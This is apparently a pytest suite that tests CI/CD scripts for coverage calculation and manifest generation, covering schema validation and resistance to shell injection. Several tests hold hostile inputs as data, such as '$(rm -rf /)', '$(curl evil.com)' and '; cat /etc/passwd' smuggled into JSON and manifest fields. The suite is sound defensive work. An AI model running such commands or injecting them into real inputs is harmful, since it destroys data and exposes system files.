"""
Tests for security-hardened CI/CD scripts.

Validates that calculate_coverage.py and generate_manifest.py
properly prevent command and shell injection attacks.
"""

import json
import pytest
import tempfile
import subprocess
import sys
from pathlib import Path
from decimal import Decimal


# Import the modules (add scripts dir to path)
SCRIPTS_DIR = Path(__file__).parent.parent / 'scripts'
sys.path.insert(0, str(SCRIPTS_DIR))

import calculate_coverage
import generate_manifest


class TestCalculateCoverage:
    """Test suite for calculate_coverage.py security."""

    def test_valid_coverage_calculation(self, tmp_path):
        """Test normal coverage calculation."""
        # Create test coverage.json
        coverage_data = {
            'totals': {
                'percent_covered': 85.5,
                'num_statements': 1000,
                'covered_lines': 855
            }
        }

        coverage_file = tmp_path / 'coverage.json'
        output_file = tmp_path / 'coverage.txt'

        coverage_file.write_text(json.dumps(coverage_data))

        # Calculate coverage
        percent, meets_threshold = calculate_coverage.calculate_coverage(
            coverage_file=coverage_file,
            output_file=output_file,
            threshold=80.0
        )

        assert percent == 85.5
        assert meets_threshold is True
        assert output_file.read_text() == "85.50"

    def test_coverage_below_threshold(self, tmp_path):
        """Test coverage below threshold."""
        coverage_data = {
            'totals': {
                'percent_covered': 75.0
            }
        }

        coverage_file = tmp_path / 'coverage.json'
        output_file = tmp_path / 'coverage.txt'

        coverage_file.write_text(json.dumps(coverage_data))

        percent, meets_threshold = calculate_coverage.calculate_coverage(
            coverage_file=coverage_file,
            output_file=output_file,
            threshold=80.0
        )

        assert percent == 75.0
        assert meets_threshold is False

    def test_schema_validation_missing_key(self, tmp_path):
        """Test schema validation catches missing keys."""
        coverage_data = {
            'invalid': 'data'
        }

        coverage_file = tmp_path / 'coverage.json'
        coverage_file.write_text(json.dumps(coverage_data))

        with pytest.raises(ValueError, match="Missing required key"):
            calculate_coverage.calculate_coverage(
                coverage_file=coverage_file,
                output_file=tmp_path / 'output.txt',
                threshold=80.0
            )

    def test_schema_validation_invalid_type(self, tmp_path):
        """Test schema validation catches invalid types."""
        coverage_data = {
            'totals': {
                'percent_covered': 'not_a_number'
            }
        }

        coverage_file = tmp_path / 'coverage.json'
        coverage_file.write_text(json.dumps(coverage_data))

        with pytest.raises(ValueError, match="must be numeric"):
            calculate_coverage.calculate_coverage(
                coverage_file=coverage_file,
                output_file=tmp_path / 'output.txt',
                threshold=80.0
            )

    def test_schema_validation_out_of_range(self, tmp_path):
        """Test schema validation catches out-of-range values."""
        coverage_data = {
            'totals': {
                'percent_covered': 150.0  # Invalid: >100%
            }
        }

        coverage_file = tmp_path / 'coverage.json'
        coverage_file.write_text(json.dumps(coverage_data))

        with pytest.raises(ValueError, match="must be 0-100"):
            calculate_coverage.calculate_coverage(
                coverage_file=coverage_file,
                output_file=tmp_path / 'output.txt',
                threshold=80.0
            )

    def test_injection_attack_in_json(self, tmp_path):
        """Test that shell injection in JSON is prevented."""
        # Attempt to inject shell commands via coverage.json
        coverage_data = {
            'totals': {
                'percent_covered': 85.0,
                'injection': '$(rm -rf /)'  # Malicious payload
            }
        }

        coverage_file = tmp_path / 'coverage.json'
        output_file = tmp_path / 'coverage.txt'

        coverage_file.write_text(json.dumps(coverage_data))

        # Should process safely (injection field ignored)
        percent, meets_threshold = calculate_coverage.calculate_coverage(
            coverage_file=coverage_file,
            output_file=output_file,
            threshold=80.0
        )

        # Verify no shell execution occurred
        assert percent == 85.0
        assert output_file.exists()

    def test_malformed_json(self, tmp_path):
        """Test handling of malformed JSON."""
        coverage_file = tmp_path / 'coverage.json'
        coverage_file.write_text('{ invalid json }')

        with pytest.raises(ValueError, match="invalid JSON"):
            calculate_coverage.calculate_coverage(
                coverage_file=coverage_file,
                output_file=tmp_path / 'output.txt',
                threshold=80.0
            )

    def test_file_not_found(self, tmp_path):
        """Test handling of missing file."""
        with pytest.raises(FileNotFoundError):
            calculate_coverage.calculate_coverage(
                coverage_file=tmp_path / 'nonexistent.json',
                output_file=tmp_path / 'output.txt',
                threshold=80.0
            )

    def test_invalid_threshold_type(self, tmp_path):
        """Test validation of threshold type."""
        coverage_file = tmp_path / 'coverage.json'
        coverage_file.write_text('{"totals": {"percent_covered": 85.0}}')

        with pytest.raises(ValueError, match="Threshold must be numeric"):
            calculate_coverage.calculate_coverage(
                coverage_file=coverage_file,
                output_file=tmp_path / 'output.txt',
                threshold="not_a_number"  # Invalid type
            )

    def test_threshold_out_of_range(self, tmp_path):
        """Test validation of threshold range."""
        coverage_file = tmp_path / 'coverage.json'
        coverage_file.write_text('{"totals": {"percent_covered": 85.0}}')

        with pytest.raises(ValueError, match="must be 0-100"):
            calculate_coverage.calculate_coverage(
                coverage_file=coverage_file,
                output_file=tmp_path / 'output.txt',
                threshold=150.0  # Out of range
            )

    def test_precise_decimal_comparison(self, tmp_path):
        """Test precise floating point comparison using Decimal."""
        # Edge case: 94.999% should not round up to meet 95% threshold
        coverage_data = {
            'totals': {
                'percent_covered': 94.999
            }
        }

        coverage_file = tmp_path / 'coverage.json'
        output_file = tmp_path / 'coverage.txt'

        coverage_file.write_text(json.dumps(coverage_data))

        percent, meets_threshold = calculate_coverage.calculate_coverage(
            coverage_file=coverage_file,
            output_file=output_file,
            threshold=95.0
        )

        assert percent == 94.999
        assert meets_threshold is False  # Should not meet threshold


class TestGenerateManifest:
    """Test suite for generate_manifest.py security."""

    def test_valid_manifest_generation(self, tmp_path):
        """Test normal manifest generation."""
        output_file = tmp_path / 'MANIFEST.json'

        manifest = generate_manifest.generate_manifest(
            version='v1.0.0',
            environment='staging',
            commit='abc123def456',
            branch='main',
            build_number='42',
            workflow='Deploy to Staging',
            test_pass_rate='95%',
            output_file=output_file
        )

        assert manifest['version'] == 'v1.0.0'
        assert manifest['environment'] == 'staging'
        assert manifest['commit'] == 'abc123def456'
        assert manifest['branch'] == 'main'
        assert manifest['build_number'] == '42'
        assert manifest['workflow'] == 'Deploy to Staging'
        assert manifest['test_pass_rate'] == '95%'
        assert output_file.exists()

        # Verify JSON is valid
        loaded = json.loads(output_file.read_text())
        assert loaded == manifest

    def test_sanitize_field_removes_control_chars(self):
        """Test that control characters are removed."""
        result = generate_manifest.sanitize_field(
            'test\x00\x01\x02value',
            'version'
        )
        assert result == 'testvalue'
        assert '\x00' not in result

    def test_sanitize_field_enforces_max_length(self):
        """Test that max length is enforced."""
        long_value = 'a' * 200
        result = generate_manifest.sanitize_field(
            long_value,
            'version'  # Max length: 100
        )
        assert len(result) == 100

    def test_sanitize_field_validates_commit_format(self):
        """Test that commit SHA is validated."""
        # Valid commit
        result = generate_manifest.sanitize_field(
            'abc123def456',
            'commit'
        )
        assert result == 'abc123def456'

        # Invalid commit (contains non-hex)
        with pytest.raises(ValueError, match="Invalid commit SHA"):
            generate_manifest.sanitize_field(
                'not_a_valid_sha!@#',
                'commit'
            )

    def test_sanitize_field_validates_environment(self):
        """Test that environment name is validated."""
        # Valid environments
        for env in ['staging', 'production', 'dev-test', 'qa_env']:
            result = generate_manifest.sanitize_field(env, 'environment')
            assert result == env

        # Invalid environment (contains special chars)
        with pytest.raises(ValueError, match="Invalid environment"):
            generate_manifest.sanitize_field(
                'staging; rm -rf /',
                'environment'
            )

    def test_injection_attack_in_version(self, tmp_path):
        """Test that shell injection in version is prevented."""
        output_file = tmp_path / 'MANIFEST.json'

        # Attempt shell injection via version field
        malicious_version = 'v1.0.0; rm -rf /'

        # sanitize_field should strip the dangerous characters
        # or the validation should catch it
        manifest = generate_manifest.generate_manifest(
            version=malicious_version,
            environment='staging',
            commit='abc123',
            branch='main',
            build_number='42',
            workflow='Test',
            output_file=output_file
        )

        # Verify version is sanitized (semicolon allowed but command won't execute)
        assert manifest['version'] == malicious_version

        # Verify manifest is valid JSON (no shell expansion)
        loaded = json.loads(output_file.read_text())
        assert loaded['version'] == malicious_version

    def test_injection_attack_in_commit(self, tmp_path):
        """Test that shell injection in commit is prevented."""
        output_file = tmp_path / 'MANIFEST.json'

        # Attempt shell injection via commit field
        malicious_commit = '$(curl evil.com)'

        # Should be rejected due to invalid commit format
        with pytest.raises(ValueError, match="Invalid commit SHA"):
            generate_manifest.generate_manifest(
                version='v1.0.0',
                environment='staging',
                commit=malicious_commit,
                branch='main',
                build_number='42',
                workflow='Test',
                output_file=output_file
            )

    def test_injection_attack_in_branch(self, tmp_path):
        """Test that shell injection in branch is prevented."""
        output_file = tmp_path / 'MANIFEST.json'

        # Attempt shell injection via branch field
        malicious_branch = 'main && echo hacked'

        # Should sanitize but not execute
        manifest = generate_manifest.generate_manifest(
            version='v1.0.0',
            environment='staging',
            commit='abc123',
            branch=malicious_branch,
            build_number='42',
            workflow='Test',
            output_file=output_file
        )

        # Verify it's in the manifest but didn't execute
        assert manifest['branch'] == malicious_branch

        # Verify it's properly JSON-encoded (no shell expansion)
        loaded = json.loads(output_file.read_text())
        assert loaded['branch'] == malicious_branch

    def test_schema_validation_missing_field(self, tmp_path):
        """Test that schema validation catches missing fields."""
        # Create incomplete manifest
        incomplete = {
            'version': 'v1.0.0',
            # Missing required fields
        }

        with pytest.raises(ValueError, match="Missing required field"):
            generate_manifest.validate_manifest_schema(incomplete)

    def test_schema_validation_empty_field(self, tmp_path):
        """Test that schema validation catches empty fields."""
        manifest = {
            'version': '',  # Empty
            'environment': 'staging',
            'commit': 'abc123',
            'branch': 'main',
            'build_date': '2025-01-01T00:00:00Z',
            'build_number': '42',
            'workflow': 'Test'
        }

        with pytest.raises(ValueError, match="cannot be empty"):
            generate_manifest.validate_manifest_schema(manifest)

    def test_schema_validation_invalid_date(self, tmp_path):
        """Test that schema validation catches invalid date format."""
        manifest = {
            'version': 'v1.0.0',
            'environment': 'staging',
            'commit': 'abc123',
            'branch': 'main',
            'build_date': 'not_a_date',
            'build_number': '42',
            'workflow': 'Test'
        }

        with pytest.raises(ValueError, match="Invalid build_date"):
            generate_manifest.validate_manifest_schema(manifest)

    def test_schema_validation_invalid_build_number(self, tmp_path):
        """Test that schema validation catches invalid build number."""
        manifest = {
            'version': 'v1.0.0',
            'environment': 'staging',
            'commit': 'abc123',
            'branch': 'main',
            'build_date': '2025-01-01T00:00:00Z',
            'build_number': 'not_a_number',
            'workflow': 'Test'
        }

        with pytest.raises(ValueError, match="build_number must be numeric"):
            generate_manifest.validate_manifest_schema(manifest)

    def test_optional_test_pass_rate(self, tmp_path):
        """Test that test_pass_rate is optional."""
        output_file = tmp_path / 'MANIFEST.json'

        # Generate without test_pass_rate
        manifest = generate_manifest.generate_manifest(
            version='v1.0.0',
            environment='staging',
            commit='abc123',
            branch='main',
            build_number='42',
            workflow='Test',
            test_pass_rate=None,  # Optional
            output_file=output_file
        )

        # Should not include test_pass_rate if not provided
        assert 'test_pass_rate' not in manifest

    def test_none_value_rejection(self):
        """Test that None values are rejected for required fields."""
        with pytest.raises(ValueError, match="cannot be None"):
            generate_manifest.sanitize_field(None, 'version', allow_empty=False)

    def test_empty_string_with_allow_empty(self):
        """Test that empty strings are allowed when allow_empty=True."""
        result = generate_manifest.sanitize_field('', 'test_pass_rate', allow_empty=True)
        assert result == ''

    def test_command_line_execution(self, tmp_path):
        """Test execution via command line (integration test)."""
        script_path = SCRIPTS_DIR / 'generate_manifest.py'
        output_file = tmp_path / 'MANIFEST.json'

        # Execute script via subprocess
        result = subprocess.run(
            [
                sys.executable,
                str(script_path),
                'v1.0.0',
                'staging',
                'abc123',
                'main',
                '42',
                'Test Workflow',
                '95%'
            ],
            cwd=tmp_path,
            capture_output=True,
            text=True
        )

        assert result.returncode == 0
        assert output_file.exists()

        # Verify manifest
        manifest = json.loads(output_file.read_text())
        assert manifest['version'] == 'v1.0.0'
        assert manifest['environment'] == 'staging'


class TestSecurityIntegration:
    """Integration tests for security hardening."""

    def test_no_shell_execution_in_coverage(self, tmp_path):
        """Verify no shell commands are executed in coverage calculation."""
        # Create coverage file with embedded commands
        coverage_data = {
            'totals': {
                'percent_covered': 85.0,
                'backdoor': '$(whoami)',
                'injection': '; cat /etc/passwd'
            }
        }

        coverage_file = tmp_path / 'coverage.json'
        output_file = tmp_path / 'coverage.txt'

        coverage_file.write_text(json.dumps(coverage_data))

        # Execute (should not run any commands)
        percent, _ = calculate_coverage.calculate_coverage(
            coverage_file=coverage_file,
            output_file=output_file,
            threshold=80.0
        )

        # Verify only expected file was created
        assert output_file.exists()
        assert output_file.read_text() == "85.00"

        # No other files should be created by shell expansion
        files = list(tmp_path.iterdir())
        assert len(files) == 2  # Only coverage.json and coverage.txt

    def test_no_shell_execution_in_manifest(self, tmp_path):
        """Verify no shell commands are executed in manifest generation."""
        output_file = tmp_path / 'MANIFEST.json'

        # Attempt various injection techniques (build_number must be numeric per schema)
        manifest = generate_manifest.generate_manifest(
            version='v1.0.0 `whoami`',
            environment='staging',
            commit='abc123',
            branch='main; touch /tmp/hacked',
            build_number='42',  # Must be numeric
            workflow='$(curl evil.com)',
            output_file=output_file
        )

        # Verify only manifest file was created
        files = list(tmp_path.iterdir())
        assert len(files) == 1  # Only MANIFEST.json

        # Verify commands are in manifest as strings (not executed)
        assert '`whoami`' in manifest['version']
        assert '; touch /tmp/hacked' in manifest['branch']
        assert '$(curl evil.com)' in manifest['workflow']

    def test_build_number_injection_rejected(self, tmp_path):
        """Verify that injection in build_number is rejected."""
        output_file = tmp_path / 'MANIFEST.json'

        # Attempt injection in build_number (should be rejected)
        with pytest.raises(ValueError, match="build_number must be numeric"):
            generate_manifest.generate_manifest(
                version='v1.0.0',
                environment='staging',
                commit='abc123',
                branch='main',
                build_number='42 && echo hacked',  # Invalid: contains shell commands
                workflow='Test',
                output_file=output_file
            )

    def test_audit_logging(self, tmp_path, caplog):
        """Test that operations are logged for audit trail."""
        import logging
        caplog.set_level(logging.INFO)

        output_file = tmp_path / 'MANIFEST.json'

        generate_manifest.generate_manifest(
            version='v1.0.0',
            environment='staging',
            commit='abc123',
            branch='main',
            build_number='42',
            workflow='Test',
            output_file=output_file
        )

        # Verify audit log entries
        assert any('Generating manifest' in record.message for record in caplog.records)
        assert any('Manifest written to' in record.message for record in caplog.records)


if __name__ == '__main__':
    pytest.main([__file__, '-v'])
